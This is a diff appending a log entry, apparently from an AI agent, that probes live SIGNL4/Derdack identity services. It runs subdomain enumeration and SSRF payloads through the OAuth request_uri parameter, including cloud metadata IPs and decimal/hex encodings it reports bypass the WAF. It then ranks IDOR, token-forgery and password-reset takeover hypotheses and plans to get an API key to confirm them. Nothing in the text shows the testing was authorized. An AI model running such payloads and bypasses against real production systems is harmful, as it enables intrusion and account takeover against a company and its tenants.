@@ -24264,3 +24264,285 @@ testability: AUTH_HELPED
 
 ## STEP 7 — RISK
 [RISK] derdack: 90 — 6 identity hosts serve one byte-identical prod RS256 key with account-host mint-mismatch (issuer=connect) against a byte-identical scope/grant surface (password/implicit/device_code/CIBA/plain-PKCE); account portal live-proves the OIDC client on that key family; events+webhook secrets double as REST API keys; every high-value vector (forgery, V1 userId IDOR, changePassword, billing BOLA) is handler-deferred AUTH_HELPED — full multi-tenant EA/SIGNL4 compromise sits one leaked client_secret/API-key/team-secret away; this cycle closed 3 avenues (authorize differential, EA-scope host, signl4 CT) with no new exposure.
+===== ANALYST bigpickle 2026-09-17 02:37:15 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mcurl -s --max-time 20 "https://connect.signl4.com/identity/.well-known/openid-configuration" -o /tmp/opencode/connect_od.json -w "%{http_code} %{size_download}\n" 2>&1 | tail -1
+200 3457
+[0m
+[0m$ [0mcurl -s --max-time 20 "https://crt.sh/?q=%25.enterprisealert.com&output=json" -o /tmp/opencode/ea.json -w "%{http_code} %{size_download}\n" 2>&1 | tail -1; curl -s --max-time 20 "https://crt.sh/?q=%25.derdack.com&output=json" -o /tmp/opencode/dd.json -w "%{http_code} %{size_download}\n" 2>&1 | tail -1
+000 0
+200 7347
+[0m
+[0m$ [0mpython3 -c "
+import json
+d=json.load(open('/tmp/opencode/dd.json'))
+names=set()
+for e in d:
+    for n in e.get('name_value','').split('\n'):
+        names.add(n.strip().lower())
+for n in sorted(names): print(n)
+" 2>&1 | head -60
+*.derdack.com
+derdack.com
+signals.derdack.com
+www.derdack.com
+[0m
+[0m$ [0mpython3 -c "
+import json
+d=json.load(open('/tmp/opencode/connect_od.json'))
+for k in ['issuer','request_parameter_supported','request_uri_parameter_supported','require_request_uri_registration','require_pushed_authorization_requests','code_challenge_methods_supported','grant_types_supported','token_endpoint_auth_methods_supported','scopes_supported','claims_supported']:
+    print(k,'=',d.get(k))
+"
+issuer = https://connect.signl4.com/identity
+request_parameter_supported = True
+request_uri_parameter_supported = None
+require_request_uri_registration = None
+require_pushed_authorization_requests = False
+code_challenge_methods_supported = ['plain', 'S256']
+grant_types_supported = ['authorization_code', 'client_credentials', 'refresh_token', 'implicit', 'password', 'urn:ietf:params:oauth:grant-type:device_code', 'urn:openid:params:grant-type:ciba', 'urn:ietf:params:oauth:grant-type:token-exchange']
+token_endpoint_auth_methods_supported = ['client_secret_basic', 'client_secret_post']
+scopes_supported = ['openid', 'email', 'profile', 'public_api_read', 'public_api_write', 'public_api_prov', 'mobile_api', 'account_portal', 'reseller_portal', 'public_api_ea_manage', 'public_api_ea_alerting', 'offline_access']
+claims_supported = ['sub', 'email', 'email_verified', 'name', 'family_name', 'given_name', 'middle_name', 'nickname', 'preferred_username', 'profile', 'picture', 'website', 'gender', 'birthdate', 'zoneinfo', 'locale', 'updated_at', 'http://schemas.derdack.com/identity/claims/active', 'http://schemas.derdack.com/identity/claims/subscription_id', 'http://schemas.derdack.com/identity/claims/branch_id', 'http://schemas.derdack.com/identity/claims/is_branch_manager', 'http://schemas.derdack.com/identity/claims/is_stakeholder']
+[0m
+[0m$ [0mcurl -s --max-time 15 -D - -o /dev/null "https://account.signl4.com/manage" 2>&1 | grep -i "^location:" | head -1
+location: https://connect.signl4.com/identity/connect/authorize?client_id=692A0A56-892F-4AE2-8259-76DA398990B6&redirect_uri=https%3A%2F%2Faccount.signl4.com%2Fmanage%2Fsignin-oidc&response_type=code&scope=openid%20profile%20account_portal%20public_api_read%20public_api_write%20public_api_prov%20offline_access&code_challenge=GAg9RvPeB8C_1w_VgXln5rXvtGmCrrLWmi1fSNSwyn0&code_challenge_method=S256&response_mode=form_post&nonce=639252091989091809.MjM4ODAzMjQtZmI0Yi00MTNhLTk3NjYtNTM3YzM3MDBlMDIyYjVhMTFjOTgtY2VhZS00NjA5LTg3ZTEtODQ3Mjk1YzljODdk&state=CfDJ8P0bhSkvNP5HkPto7qc9KqPrjM5cKLOk7Fz4gsCyph1wIIDGQTMcM93fl9lZl9vxaco6H-q_t1twuyTA_fvdCveR-_K3dVX3GWRMhzVmEaBMz6-KFmQCMvk-fve0xUWPnaPnKNdIbKMjd2TXOmXkREr9Pfu7nDFM9ivXgYkcymbA200knMsn8XpI0v4f-dVEflyM-WoiIqFoWL1ej8GYg-OnKXiMpc7JE5PKrzTFWYFOy0QZRLEf32C_1eQ-5jHOW90sdT3rztmKH7JPm0HoV7wwZ8X7wFNLwLDWl-ZuOTwMedrrWlRutqeInNEVCSkuxmtf1e52oZqthV8zc9MvEWWWEabelUZafbpX6NaIn8MQ6C-FTnhaMccwJhuv5v0CUs9POo9M9Wl1C5Coe_o73dQ&x-client-SKU=ID_NET10_0&x-client-ver=8.19.2.0
+[0m
+[0m$ [0mcurl -s --max-time 15 -D - -o /dev/null "https://devconnect.signl4.com/identity/connect/authorize?client_id=692A0A56-892F-4AE2-8259-76DA398990B6&response_type=code&scope=openid%20profile&redirect_uri=https%3A%2F%2Fdevaccount.signl4.com%2Fmanage%2Fsignin-oidc&state=x&nonce=y" 2>&1 | grep -iE "^(HTTP|location)" | head -5
+HTTP/2 302 
+location: https://devconnect.signl4.com/identity/home/error?errorId=CfDJ8HRhdHKj5_pDq2dFwl0f4pzLhirOcGTdsnG2PM64PgUUjYaq5IvMC8zSaBsQdwhTMiVSiyaRSgO6QdwldzW4ZTGgriEeEaccMSMgkNP5LAueterOLItloBausKS9GaWlVdD3RufsR67xplGXs4Ih4MmORZ6IweMls68623Ylx3bTff4KgEeSbibLNKNevRKih1u_vFY6bYC46nixbjJodvSrm9CGmI6OI10lWcJVa2oJuoZ6pGaFLSGvUCGXn2kDUQvpetwQjAG4n8gNREs-YjP-Ue10m4cimiJ9M6wQYv2mfw7JC2DWyaPjAfdr7CPLgXtJoDi8czwOFicVvucUbzhwHEZHpc8HNk6InGe58SiMp4A4uVAJQwL0YV7yPsHADOtfKuAnCktYvapPTjHekGVhyZqbN2QmzN5Emv2Jyzjb4qR9qzrrdw7kQvLyUDXtPzhiWGJdyOnFs8VMzJ8nIUuWoXSfa-dJNLl7jOzLelg3
+[0m
+[0m$ [0mbase="https://devconnect.signl4.com/identity/connect/authorize?client_id=692A0A56-892F-4AE2-8259-76DA398990B6&response_type=code&scope=openid&redirect_uri=https%3A%2F%2Fdevaccount.signl4.com%2Fmanage%2Fsignin-oidc&state=a&nonce=b"
+for u in "https://example.com/" "https://no-such-host-zzz999.invalid/token.jwt" "http://169.254.169.254/latest/meta-data/"; do
+  echo "=== request_uri=$u"
+  curl -s --max-time 25 -o /dev/null -w "code=%{http_code} time=%{time_total} redirect=%{redirect_url}\n" "$base&request_uri=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$u")"
+  sleep 1
+done
+=== request_uri=https://example.com/
+code=302 time=0.488070 redirect=https://devconnect.signl4.com/identity/home/error?errorId=CfDJ8HRhdHKj5_pDq2dFwl0f4pxndfQTkwzzDzqCRfFNPdRrwD6ldWlgwyyVMVHaMIX1L8JOSG5grdaZll4ct0MZFwHHPvdn8kR3ajwuqoErDSPZGzvhC8aYxxETb9klqfp7kUxoaHNFqKX6Lh6QS42yMoY0B6k-WK3Hwhj3db8fpiTgdhxcuHwROmAxnZTAaYMPIiqk5-308yktz26mzetHRkXAZvDayl-IcHlHZuOEm6cg6Ode9ACg8Lr1Ccj6R1w5vcYmHyQiMf6sVmCDaML7--IegoYCTFsfK6QprbQPlTptEkxEBsTwkXPn_2u1AGYIAymrkB1Q_Pm-eJBCmc1prMdMKwGbvgug2IbnvL6s1bm6CCOy9nlkG3y-1ol_LoSBvdYm1yQp-cqKwNIQEuAspbbY-T8BIjdcc60V9PqLtL1ya--RXe34PZmNvAWszraLRg
+=== request_uri=https://no-such-host-zzz999.invalid/token.jwt
+code=302 time=0.422621 redirect=https://devconnect.signl4.com/identity/home/error?errorId=CfDJ8HRhdHKj5_pDq2dFwl0f4pwMMk0wM3RBokm-5xOt2WFY7HYP6Jpl5GAB6BksvKd61SQNLdZj9qlJqJpb9thXXfQ85yNXbfb3lHu6K951HYR8qirkMjUSSw_Dqm4zRaiXw0Hi6GCQIhstTDmniQU8H-8_CMsvsbeAgVYhqSiuHbpsYcGR2U9DmmkMIwHeqGVbkHjD78pigm3wOHllCG2om-g8NDbh295nr4I34s1BgfFzuUH6bg5OZPrfqxPom5NbtAvRZPGAiPhZOBOW8Yh_wIwoN38mwuXTmUH7b8v8QSduP25aKLRr_pBqHFKYuFNBuyPHlS2s1XYTe_LrVgul4GdSdCSyOFOlT7aOdprqfTMYzFsjgH1CWJV-fohJQqwRJvqLiFxIBXH1o9QTipquQtIYMbUX-0LSLLq2K_1dZj1fkzpebC7CB-X_H0HcPJHEqg
+=== request_uri=http://169.254.169.254/latest/meta-data/
+code=403 time=0.647831 redirect=
+[0m
+[0m$ [0mbase="https://devconnect.signl4.com/identity/connect/authorize?client_id=692A0A56-892F-4AE2-8259-76DA398990B6&response_type=code&scope=openid&redirect_uri=https%3A%2F%2Fdevaccount.signl4.com%2Fmanage%2Fsignin-oidc&state=a&nonce=b"
+for u in "http://169.254.169.254/" "http://127.0.0.1/" "http://10.0.0.1/" "http://100.100.100.200/" "http://192.168.0.1/" "http://8.8.8.8/"; do
+  echo "=== $u"
+  curl -s --max-time 20 -D - -o /tmp/opencode/body.txt -w "code=%{http_code} time=%{time_total}\n" "$base&request_uri=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$u")" | grep -iE "^(HTTP|server|location|content-type|x-azure|cf-|x-ws)";
+  echo "--- body head:"; head -c 200 /tmp/opencode/body.txt; echo
+  sleep 1
+done
+=== http://169.254.169.254/
+HTTP/2 403 
+server: Microsoft-Azure-Application-Gateway/v2
+content-type: text/html
+--- body head:
+<html>
+    <head>
+        <title>SIGNL4 - Forbidden</title>
+        <style id="fontFamily">
+            @font-face {
+                font-family: 'open_sanslight';
+                src: url(data:applic
+=== http://127.0.0.1/
+HTTP/2 403 
+server: Microsoft-Azure-Application-Gateway/v2
+content-type: text/html
+--- body head:
+<html>
+    <head>
+        <title>SIGNL4 - Forbidden</title>
+        <style id="fontFamily">
+            @font-face {
+                font-family: 'open_sanslight';
+                src: url(data:applic
+=== http://10.0.0.1/
+HTTP/2 403 
+server: Microsoft-Azure-Application-Gateway/v2
+content-type: text/html
+--- body head:
+<html>
+    <head>
+        <title>SIGNL4 - Forbidden</title>
+        <style id="fontFamily">
+            @font-face {
+                font-family: 'open_sanslight';
+                src: url(data:applic
+=== http://100.100.100.200/
+HTTP/2 403 
+server: Microsoft-Azure-Application-Gateway/v2
+content-type: text/html
+--- body head:
+<html>
+    <head>
+        <title>SIGNL4 - Forbidden</title>
+        <style id="fontFamily">
+            @font-face {
+                font-family: 'open_sanslight';
+                src: url(data:applic
+=== http://192.168.0.1/
+HTTP/2 403 
+server: Microsoft-Azure-Application-Gateway/v2
+content-type: text/html
+--- body head:
+<html>
+    <head>
+        <title>SIGNL4 - Forbidden</title>
+        <style id="fontFamily">
+            @font-face {
+                font-family: 'open_sanslight';
+                src: url(data:applic
+=== http://8.8.8.8/
+HTTP/2 403 
+server: Microsoft-Azure-Application-Gateway/v2
+content-type: text/html
+--- body head:
+<html>
+    <head>
+        <title>SIGNL4 - Forbidden</title>
+        <style id="fontFamily">
+            @font-face {
+                font-family: 'open_sanslight';
+                src: url(data:applic
+[0m
+[0m$ [0mfor h in signals.derdack.com www.vps.signl4.com admin.signl4.com fix.signl4.com; do echo -n "$h -> "; getent hosts "$h" 2>/dev/null | head -1 || echo "NXDOMAIN"; done
+signals.derdack.com -> www.vps.signl4.com -> admin.signl4.com -> 132.220.132.233 admin.signl4.com
+fix.signl4.com -> 20.160.37.197   s4prodappgw.westeurope.cloudapp.azure.com fix.signl4.com
+[0m
+[0m$ [0mcurl -s --max-time 30 "https://crt.sh/?q=%25.enterprisealert.com&output=json" -o /tmp/opencode/ea.json -w "code=%{http_code} size=%{size_download}\n" 2>&1 | tail -1
+python3 -c "
+import json
+try:
+    d=json.load(open('/tmp/opencode/ea.json'))
+    names=set()
+    for e in d:
+        for n in e.get('name_value','').split('\n'): names.add(n.strip().lower())
+    print('\n'.join(sorted(names)))
+except Exception as ex: print('ERR',ex)
+" 2>&1 | head -80
+code=404 size=253
+ERR Expecting value: line 1 column 1 (char 0)
+[0m
+[0m$ [0mcurl -s --max-time 15 -D - -o /tmp/opencode/admin.html "https://admin.signl4.com/" 2>&1 | grep -iE "^(HTTP|server|location|x-|content-type)" | head -15; echo "---"; head -c 300 /tmp/opencode/admin.html
+---
+head: cannot open '/tmp/opencode/admin.html' for reading: No such file or directory
+[0m
+[0m$ [0mfor p in / /identity/.well-known/openid-configuration /manage /api/v2/teams; do
+  echo "=== admin.signl4.com$p"
+  curl -s --max-time 15 -o /dev/null -w "code=%{http_code} server=%{content_type} redirect=%{redirect_url}\n" "https://admin.signl4.com$p" 2>&1
+done
+=== admin.signl4.com/
+code=000 server= redirect=
+=== admin.signl4.com/identity/.well-known/openid-configuration
+code=000 server= redirect=
+=== admin.signl4.com/manage
+code=000 server= redirect=
+=== admin.signl4.com/api/v2/teams
+code=000 server= redirect=
+[0m
+[0m$ [0mbase="https://devconnect.signl4.com/identity/connect/authorize?client_id=692A0A56-892F-4AE2-8259-76DA398990B6&response_type=code&scope=openid&redirect_uri=https%3A%2F%2Fdevaccount.signl4.com%2Fmanage%2Fsignin-oidc&state=a&nonce=b"
+for u in "http://169.254.169.254.nip.io/latest/meta-data/" "http://2852039166/" "http://0xA9FEA9FE/" "http://metadata.google.internal/computeMetadata/v1/"; do
+  echo "=== $u"
+  curl -s --max-time 20 -o /dev/null -w "code=%{http_code} time=%{time_total} redirect=%{redirect_url}\n" "$base&request_uri=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$u")" | cut -c1-160
+  sleep 1
+done
+=== http://169.254.169.254.nip.io/latest/meta-data/
+code=403 time=0.738122 redirect=
+=== http://2852039166/
+code=302 time=0.438169 redirect=https://devconnect.signl4.com/identity/home/error?errorId=CfDJ8HRhdHKj5_pDq2dFwl0f4px0SzK-7J0Ot2qOuuhbXqqX7FI911bGz3bWEjce5BERXS
+=== http://0xA9FEA9FE/
+code=302 time=0.420470 redirect=https://devconnect.signl4.com/identity/home/error?errorId=CfDJ8HRhdHKj5_pDq2dFwl0f4pwfpV4FRUEgGcJ669Ii5tjaYyWvC44IrlCxgBqLDC8BBL
+=== http://metadata.google.internal/computeMetadata/v1/
+code=302 time=0.424681 redirect=https://devconnect.signl4.com/identity/home/error?errorId=CfDJ8HRhdHKj5_pDq2dFwl0f4pzd_hlPo2XAu5RsB9-yUG7gFzrlzAOumsmw3xVn1knCwE
+[0m
+[0m$ [0mbase="https://devconnect.signl4.com/identity/connect/authorize?client_id=692A0A56-892F-4AE2-8259-76DA398990B6&response_type=code&scope=openid&redirect_uri=https%3A%2F%2Fdevaccount.signl4.com%2Fmanage%2Fsignin-oidc&state=a&nonce=b"
+for u in "https://httpbin.org/delay/6" "https://deelay.me/6000/https://example.com/" "https://example.com/"; do
+  echo "=== $u"
+  curl -s --max-time 30 -o /dev/null -w "code=%{http_code} time=%{time_total}\n" "$base&request_uri=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$u")"
+  sleep 1
+done
+echo "=== baseline (no request_uri)"
+curl -s --max-time 30 -o /dev/null -w "code=%{http_code} time=%{time_total}\n" "$base"
+=== https://httpbin.org/delay/6
+code=302 time=0.415154
+=== https://deelay.me/6000/https://example.com/
+code=302 time=0.415754
+=== https://example.com/
+code=302 time=0.401133
+=== baseline (no request_uri)
+code=302 time=0.394573
+[0m
+[0m$ [0mbase="https://connect.signl4.com/identity/connect/authorize?client_id=692A0A56-892F-4AE2-8259-76DA398990B6&response_type=code&scope=openid&redirect_uri=https%3A%2F%2Faccount.signl4.com%2Fmanage%2Fsignin-oidc&state=a&nonce=b"
+for u in "https://httpbin.org/delay/6" "http://2852039166/latest/meta-data/" "http://169.254.169.254/"; do
+  echo "=== $u"
+  curl -s --max-time 30 -o /dev/null -w "code=%{http_code} time=%{time_total} redirect=%{redirect_url}\n" "$base&request_uri=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$u")" | cut -c1-120
+  sleep 1
+done
+=== https://httpbin.org/delay/6
+code=302 time=0.413433 redirect=https://connect.signl4.com/identity/home/error?errorId=CfDJ8P0bhSkvNP5HkPto7qc9KqOk3bfTp
+=== http://2852039166/latest/meta-data/
+code=302 time=0.391259 redirect=https://connect.signl4.com/identity/home/error?errorId=CfDJ8P0bhSkvNP5HkPto7qc9KqNigaFtp
+=== http://169.254.169.254/
+code=403 time=0.629662 redirect=
+[0m
+STEP 1 — DELTA
+- [NEW] `connect`+`devconnect` OIDC discovery live: `request_parameter_supported=true` (JAR on), `request_uri_parameter_supported` absent, `require_pushed_authorization_requests=false`, PKCE `[plain,S256]` — `request_uri` is accepted at `/identity/connect/authorize`.
+- [NEW] authorize `request_uri` probe: literal `169.254.169.254`/IP-literal → `403 SIGNL4-Forbidden` (Azure AppGW); decimal `2852039166`/hex `0xA9FEA9FE`/`metadata.google.internal` encodings bypass WAF and reach IdP (`302 /identity/home/error`). Delay-oracle `httpbin.org/delay/6` → `302` in **0.41s** vs 0.39s baseline → **no server-side fetch**. request_uri SSRF dead.
+- [NEW] crt.sh `%.derdack.com` = only 4 names (`derdack.com`, `*.derdack.com`, `www`, `signals`); `signals.derdack.com` still NXDOMAIN; `www.vps.signl4.com` no longer resolves; `admin.signl4.com`→132.220.132.233 but all paths `000` (TCP-dead, inert).
+- [CHANGED] `account`/`connect` identity discovery twins byte-identical incl. full 12-scope set; "EA scopes account-exclusive" stays invalidated. account remains 6th signing-key twin.
+
+STEP 2 — PRIORITIZE
+- [PRIO] account.signl4.com/identity/connect/token, 7.65, business=10+tech=9 (OIDC/plain-PKCE/JAR, gate_ease=1, fresh=6)
+- [PRIO] connect.signl4.com/identity/connect/authorize (request_uri/JAR), 8.15, attack_surface=6 (unauth JAR surface, gate_ease=10, fresh=9)
+- [PRIO] connect.signl4.com/api/v1/alerts/{acknowledgeAll,closeAll,paged,report}, 6.50, business=8+IDOR, gate_ease=2, fresh=7
+- [PRIO] connect.signl4.com/api/v2/users/{id}/changePassword, 6.25, business=8+IDOR, gate_ease=2, fresh=6
+
+STEP 3 — HYPOTHESES
+[HYP] Cross-env token forgery via 6-host shared RS256 IdP family with account-host mint-mismatch
+class: AUTH
+asset: account.signl4.com/identity/connect/token + connect.signl4.com/api
+confidence: 88
+reasoning: 6 identity hosts (connect/devconnect/api/devapi/account/devaccount) serve byte-identical RS256 JWKS kid 91EE4F3C; account discovery claims issuer=connect with byte-identical 12-scope set; grants incl password/implicit/device_code/CIBA/token-exchange + plain PKCE; token_endpoint_auth_methods only client_secret_basic/post (no public client); authorize verified no redirect_uri/state echo.
+evidence_needed: any valid client_secret OR leaked X-S4-Api-Key/Bearer from one host.
+verify_steps: (passive done) discovery deep-diff + JWKS deep-equal; (AUTH_HELPED) `POST account.signl4.com/identity/connect/token` password grant → Bearer → `GET connect.signl4.com/api/v2/teams` 401→200.
+impact: EA-manage/reseller/mobile_api Bearer accepted by prod backend → multi-tenant alert CRUD + EA management; CRITICAL once one credential leaks.
+testability: AUTH_HELPED
+
+[HYP] V1 bulk alert acknowledge/close/paged/report honors arbitrary userId query param
+class: IDOR
+asset: connect.signl4.com/api/v1/alerts/{acknowledgeAll,closeAll,paged,report}
+confidence: 62
+reasoning: userId query param documented in V1+V2 swagger on 4 endpoints; 403 description "in behave of the user" confirms coded impersonation; routes live (OPT 405 / anon handler-deferred); shared backend appId ec6c57ca.
+evidence_needed: authenticated A/B — `report?userId=<other>` dataset diff vs omitted under operator key.
+verify_steps: (AUTH_HELPED) `GET /api/v1/alerts/report?userId=<other>`; `POST /api/v2/alerts/paged?maxResults=1&userId=<other>`.
+impact: per-user alert/response-metrics disclosure + cross-user ack/close with audit-attribution spoofing; MEDIUM-HIGH.
+testability: AUTH_HELPED
+
+[HYP] V2 users/{id}/changePassword honors arbitrary userId via handler-side auth only
+class: IDOR
+asset: connect.signl4.com/api/v2/users/{userId}/changePassword
+confidence: 58
+reasoning: PUT-only route (Allow:PUT) live; anon OPTIONS 405-not-401 mirrors handler-deferred family; V1 impersonation typo proves operator-impersonation is coded.
+evidence_needed: authenticated A/B — PUT changePassword for sibling vs self under operator-owned key.
+verify_steps: (AUTH_HELPED) `PUT /api/v2/users/{target}/changePassword`.
+impact: sibling-tenant password reset → tenant ATO; HIGH.
+testability: AUTH_HELPED
+
+STEP 4 — SELF-CRITIQUE
+- [PARKED] OAuth request_uri SSRF @ devconnect/connect /identity/connect/authorize: live-tested; WAF blocks literal metadata IP only, decimal/hex reach IdP, but delay-oracle proves NO outbound fetch — request_uri not registered/fetched; no SSRF.
+- [PARKED] V1 prepaid/{balance,transactions} cross-subscription read (45): no new evidence; fully AUTH_HELPED.
+- [PARKED] events/webhook secret enumeration: operator-entropy under REJECTED brute-force class; leak-only.
+- [FINAL] 1) account IdP cross-env forgery (88) 2) V1 alerts userId IDOR (62) 3) V2 changePassword IDOR (58) — all AUTH_HELPED; every survivor gated on one leaked client_secret/API-key.
+
+STEP 5 — NEXT ACTION
+[NEXT] HUMAN: obtain a self-registered SIGNL4 trial/operator `X-S4-Api-Key` (legitimate low-priv account) to convert the standing AUTH_HELPED IDOR/BOLA hypotheses (V1 alerts userId, V2 changePassword, V3 invoice/BOLA) into validated findings — this is the sole blocker across all top survivors.
+
+STEP 6 — LEARNING
+- [LEARN] REJECTED SSRF @ connect+devconnect /identity/connect/authorize: literal metadata IP → AppGW 403; decimal/hex 169.254.169.254 + arbitrary hostnames reach IdP (302) but httpbin /delay/6 returns in 0.41s = no outbound fetch — request_uri SSRF closed.
+- [LEARN] ACCEPTED MISCONFIG @ connect+devconnect authorize: WAF substring-blocks "169.254.169.254"/IP literals in `request_uri` while decimal/hex encodings pass — normalization gap, no downstream impact.
+- [LEARN] REJECTED OTHER @ crt.sh derdack.com + DNS: no new hosts; signals.derdack.com NXDOMAIN, www.vps.signl4.com dead, admin.signl4.com resolves but TCP-dead.
+- [LEARN] ACCEPTED OTHER @ account/connect identity discovery: twins byte-identical full 12-scope set; EA-scope-exclusive claim remains invalidated.
+
+STEP 7 — RISK
+[RISK] derdack: 90 — 6 identity hosts share one byte-identical prod RS256 key with account-host issuer mismatch against a byte-identical scope/grant surface (password/implicit/device_code/CIBA/plain-PKCE/JAR), and every high-value vector (forgery, V1/V3 userId+BOLA, changePassword, billing) sits behind handler-deferred AUTH_HELPED auth; full multi-tenant EA/SIGNL4 compromise is one leaked client_secret/API-key/team-secret away. This cycle closed request_uri SSRF and re-confirmed the derdack CT/DNS surface is static.
